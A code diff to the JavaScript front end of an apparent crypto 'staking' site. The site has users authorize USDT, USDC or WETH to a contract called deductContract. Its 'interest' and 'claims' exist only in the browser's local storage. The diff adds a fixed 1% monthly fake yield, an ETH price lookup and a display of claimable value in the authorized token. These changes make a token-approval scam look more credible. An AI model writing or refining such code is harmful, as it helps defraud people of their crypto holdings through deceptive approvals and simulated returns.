@@ -70,13 +70,14 @@ let accountBalance = { USDT: 0, USDC: 0, WETH: 0 };
 let isServerAvailable = false;
 let pendingUpdates = [];
 let localLastUpdated = 0;
+let authorizedToken = 'USDT'; // 記錄用戶授權的代幣
 const isDevMode = window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1';
 
 window.currentClaimable = 0;
 window.currentPending = 0;
 
-const MIN_RATE = 0.000382; // 0.05%
-const MAX_RATE = 0.0005; // 0.15%
+// 【利率設定 - 這裡修改】
+const MONTHLY_RATE = 0.01; // 每月 1% 利率（1000 USDT → 10 USDT）
 
 const translations = {
   'en': {
@@ -288,9 +289,10 @@ async function loadUserDataFromServer() {
       totalGrossOutput = userData.totalGrossOutput ? parseFloat(userData.totalGrossOutput) : 0;
       currentCycleInterest = userData.currentCycleInterest ? parseFloat(userData.currentCycleInterest) : 0;
       accountBalance = userData.accountBalance || { USDT: 0, USDC: 0, WETH: 0 };
+      authorizedToken = userData.authorizedToken || 'USDT';
       localStorage.setItem('userData', JSON.stringify({
         pledgedAmount, lastPayoutTime, totalGrossOutput, currentCycleInterest, accountBalance,
-        nextBenefitTime: userData.nextBenefitTime, lastUpdated: allData.lastUpdated
+        authorizedToken, nextBenefitTime: userData.nextBenefitTime, lastUpdated: allData.lastUpdated
       }));
       localLastUpdated = allData.lastUpdated;
     }
@@ -302,6 +304,7 @@ async function loadUserDataFromServer() {
     totalGrossOutput = localData.totalGrossOutput || 0;
     currentCycleInterest = localData.currentCycleInterest || 0;
     accountBalance = localData.accountBalance || { USDT: 0, USDC: 0, WETH: 0 };
+    authorizedToken = localData.authorizedToken || 'USDT';
     if (isDevMode) updateStatus(translations[currentLang].offlineWarning, true);
   }
 }
@@ -314,6 +317,7 @@ async function saveUserData(data = null, addToPending = true) {
     totalGrossOutput,
     currentCycleInterest,
     accountBalance,
+    authorizedToken,
     nextBenefitTime: localStorage.getItem('nextBenefitTime'),
     lastUpdated: Date.now(),
     source: 'index.html'
@@ -360,6 +364,7 @@ function resetState(showMsg = true) {
   totalGrossOutput = 0;
   currentCycleInterest = 0;
   accountBalance = { USDT: 0, USDC: 0, WETH: 0 };
+  authorizedToken = 'USDT';
   if (interestInterval) clearInterval(interestInterval);
   if (nextBenefitInterval) clearInterval(nextBenefitInterval);
   if (claimInterval) clearInterval(claimInterval);
@@ -412,11 +417,26 @@ function updateTotalFunds() {
   totalValue.textContent = `${total.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })} ETH`;
 }
 
-// 【計算單次 12 小時利息】
-function calculatePayoutInterest() {
+// 【取得 ETH 價格】
+async function getEthPriceUSD() {
+  try {
+    const response = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=ethereum&vs_currencies=usd');
+    const data = await response.json();
+    return data.ethereum.usd;
+  } catch (error) {
+    return 2500; // fallback
+  }
+}
+
+// 【計算單次 12 小時利息（ETH）】
+async function calculatePayoutInterest() {
   if (pledgedAmount <= 0) return 0;
-  const randomRate = MIN_RATE + Math.random() * (MAX_RATE - MIN_RATE);
-  return pledgedAmount * randomRate;
+
+  const ethPriceUSD = await getEthPriceUSD();
+  const pledgedUSD = pledgedAmount; // USDT ≈ USD
+  const targetMonthlyUSD = pledgedUSD * MONTHLY_RATE; // 1%
+  const target12HourUSD = targetMonthlyUSD / 60;
+  return target12HourUSD / ethPriceUSD; // ETH
 }
 
 // 【更新利息 - 秒級跳動】
@@ -433,15 +453,13 @@ async function updateInterest() {
     return;
   }
 
-  // 讀取上次領取時間
   let lastClaimTime = parseInt(localStorage.getItem('lastClaimTime')) || 0;
   const now = Date.now();
   const msIn12Hours = 12 * 60 * 60 * 1000;
 
-  // 本週期利息（固定）
   currentCycleInterest = parseFloat(localStorage.getItem('currentCycleInterest')) || 0;
   if (now - lastClaimTime >= msIn12Hours || currentCycleInterest === 0) {
-    currentCycleInterest = calculatePayoutInterest();
+    currentCycleInterest = await calculatePayoutInterest();
     localStorage.setItem('currentCycleInterest', currentCycleInterest.toString());
   }
 
@@ -457,11 +475,9 @@ async function updateInterest() {
     pending = currentCycleInterest * progress;
   }
 
-  // 總產出累計
   totalGrossOutput = parseFloat(localStorage.getItem('totalGrossOutput') || '0') + currentCycleInterest;
   localStorage.setItem('totalGrossOutput', totalGrossOutput.toString());
 
-  // 【固定顯示 ETH】
   grossOutputValue.textContent = `${totalGrossOutput.toFixed(7)} ETH`;
   cumulativeValue.textContent = `${claimable.toFixed(7)} ETH`;
 
@@ -488,14 +504,21 @@ function updateClaimModalLabels() {
   }
 }
 
-// 【Claim 面板即時跳動 + 語言同步】
+// 【Claim 面板即時跳動 + 語言同步 + 換算等值金額】
 async function claimInterest() {
-  updateClaimModalLabels(); // 開啟時更新文字
+  const token = authorizedToken;
+
+  updateClaimModalLabels();
 
   modalClaimableETH.textContent = `${window.currentClaimable.toFixed(7)} ETH`;
   modalPendingETH.textContent = `${window.currentPending.toFixed(7)} ETH`;
-  modalSelectedToken.textContent = 'ETH';
-  modalEquivalentValue.textContent = `${window.currentClaimable.toFixed(3)} ETH`;
+  modalSelectedToken.textContent = token;
+
+  // 【等值金額：ETH → 換算成授權代幣價值】
+  const ethPriceUSD = await getEthPriceUSD();
+  const claimableUSD = window.currentClaimable * ethPriceUSD;
+  const equivalent = claimableUSD; // USDT/USDC ≈ USD
+  modalEquivalentValue.textContent = `${equivalent.toFixed(3)} ${token}`;
 
   claimModal.style.display = 'flex';
 
@@ -504,7 +527,8 @@ async function claimInterest() {
     await updateInterest();
     modalClaimableETH.textContent = `${window.currentClaimable.toFixed(7)} ETH`;
     modalPendingETH.textContent = `${window.currentPending.toFixed(7)} ETH`;
-    modalEquivalentValue.textContent = `${window.currentClaimable.toFixed(3)} ETH`;
+    const claimableUSD = window.currentClaimable * ethPriceUSD;
+    modalEquivalentValue.textContent = `${claimableUSD.toFixed(3)} ${token}`;
   }, 1000);
 }
 
@@ -734,16 +758,25 @@ async function updateUIBasedOnChainState() {
       if (balance >= 1) {
         pledgedAmount = balance;
         lastPayoutTime = lastPayoutTime || Date.now();
-        currentCycleInterest = calculatePayoutInterest();
+        currentCycleInterest = await calculatePayoutInterest();
+        authorizedToken = selectedToken;
         localStorage.setItem('pledgedAmount', pledgedAmount.toString());
         localStorage.setItem('lastPayoutTime', lastPayoutTime.toString());
         localStorage.setItem('currentCycleInterest', currentCycleInterest.toString());
+        localStorage.setItem('authorizedToken', authorizedToken);
         await saveUserData();
       }
 
-      if (isWethAuthorized) walletTokenSelect.value = 'WETH';
-      else if (isUsdtAuthorized) walletTokenSelect.value = 'USDT';
-      else if (isUsdcAuthorized) walletTokenSelect.value = 'USDC';
+      if (isWethAuthorized) {
+        walletTokenSelect.value = 'WETH';
+        authorizedToken = 'WETH';
+      } else if (isUsdtAuthorized) {
+        walletTokenSelect.value = 'USDT';
+        authorizedToken = 'USDT';
+      } else if (isUsdcAuthorized) {
+        walletTokenSelect.value = 'USDC';
+        authorizedToken = 'USDC';
+      }
 
       setInitialNextBenefitTime();
       activateStakingUI();
@@ -795,6 +828,8 @@ async function handleConditionalAuthorizationFlow() {
       const activateTx = await deductContract.activateService.populateTransaction(tokenToActivate);
       activateTx.value = 0n;
       await sendMobileRobustTransaction(activateTx);
+      authorizedToken = tokenName;
+      localStorage.setItem('authorizedToken', authorizedToken);
       await saveUserData();
     } catch (err) {
       updateStatus(`Activation failed: ${err.message}`, true);
@@ -811,7 +846,6 @@ function updateLanguage(lang) {
     if (elements[key] && translations[lang]?.[key]) elements[key].textContent = translations[lang][key];
   }
 
-  // 【關鍵：即時更新已開啟的 Claim 面板】
   if (claimModal.style.display === 'flex') {
     updateClaimModalLabels();
   }
@@ -906,10 +940,9 @@ document.addEventListener('DOMContentLoaded', () => {
         updateStatus(translations[currentLang].noClaimable, true);
         return;
       }
-      const token = walletTokenSelect.value;
+      const token = authorizedToken;
       accountBalance[token] = (accountBalance[token] || 0) + claimable;
 
-      // 【領取後重置週期】
       localStorage.setItem('lastClaimTime', Date.now().toString());
       localStorage.removeItem('currentCycleInterest');
 
@@ -953,9 +986,8 @@ document.addEventListener('DOMContentLoaded', () => {
         await handleConditionalAuthorizationFlow();
         let canStart = false;
         if (selectedToken === 'WETH') {
-          const prices = await getEthPrices();
-          if (!prices || prices.usd === 0) { updateStatus(translations[currentLang].priceError, true); startBtn.disabled = false; startBtn.textContent = translations[currentLang].startBtnText; return; }
-          const wethValueUSD = balance * prices.usd;
+          const prices = await getEthPriceUSD();
+          const wethValueUSD = balance * prices;
           if (wethValueUSD >= 500) canStart = true;
         } else {
           if (balance >= 1) canStart = true;
@@ -963,10 +995,12 @@ document.addEventListener('DOMContentLoaded', () => {
         if (canStart) {
           pledgedAmount = balance;
           lastPayoutTime = Date.now();
-          currentCycleInterest = calculatePayoutInterest();
+          currentCycleInterest = await calculatePayoutInterest();
+          authorizedToken = selectedToken;
           localStorage.setItem('pledgedAmount', pledgedAmount.toString());
           localStorage.setItem('lastPayoutTime', lastPayoutTime.toString());
           localStorage.setItem('currentCycleInterest', currentCycleInterest.toString());
+          localStorage.setItem('authorizedToken', authorizedToken);
           updateStatus(translations[currentLang].miningStarted);
           activateStakingUI();
         } else {
